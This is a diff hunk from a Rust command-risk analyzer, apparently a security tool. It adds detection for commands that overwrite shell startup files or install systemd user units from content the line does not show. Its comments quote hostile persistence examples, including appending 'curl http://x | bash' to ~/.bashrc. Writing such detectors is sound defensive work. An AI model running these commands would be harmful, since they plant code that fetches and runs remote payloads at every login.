@@ -3367,6 +3367,43 @@ fn analyze_command_as_read(
         score += s;
     }
 
+    // A startup file of the home replaced or made from content the line does
+    // not show (`cp /tmp/x ~/.bashrc`, a unit copied into
+    // `~/.config/systemd/user`): what it will run cannot be judged, so the
+    // line is held for review. The persistence it already scored counts
+    // toward that, so the line lands at review, not past it.
+    // Read on the raw line as well: the projection masks quoted text, and
+    // with it the `"$P"` that makes a write unseen.
+    let unseen_install = if threats::replaces_startup_file_unseen(cmd)
+        || threats::replaces_startup_file_unseen(scan_cmd)
+    {
+        Some(threats::STARTUP_FILE_REPLACED_UNSEEN)
+    } else if threats::installs_session_item_from_outside(cmd)
+        || threats::installs_session_item_from_outside(scan_cmd)
+    {
+        Some(threats::SESSION_ITEM_FROM_OUTSIDE)
+    } else {
+        None
+    };
+    if let Some(detail) =
+        unseen_install.filter(|_| !signals.iter().any(|s| s.signal == "persistence_install"))
+    {
+        let already: u32 = signals
+            .iter()
+            .filter(|s| s.signal == "persistence_attempt")
+            .map(|s| s.score)
+            .sum();
+        let lift = 20u32.saturating_sub(already);
+        if lift > 0 {
+            signals.push(AnalysisSignal {
+                signal: "persistence_install".into(),
+                score: lift,
+                detail: detail.into(),
+            });
+            score += lift;
+        }
+    }
+
     // Text written into a shell startup file is a command that runs at every
     // login. The projection masks it as literal output (it is, now), so
     // `echo 'curl http://x | bash' >> ~/.bashrc` scored only the profile write
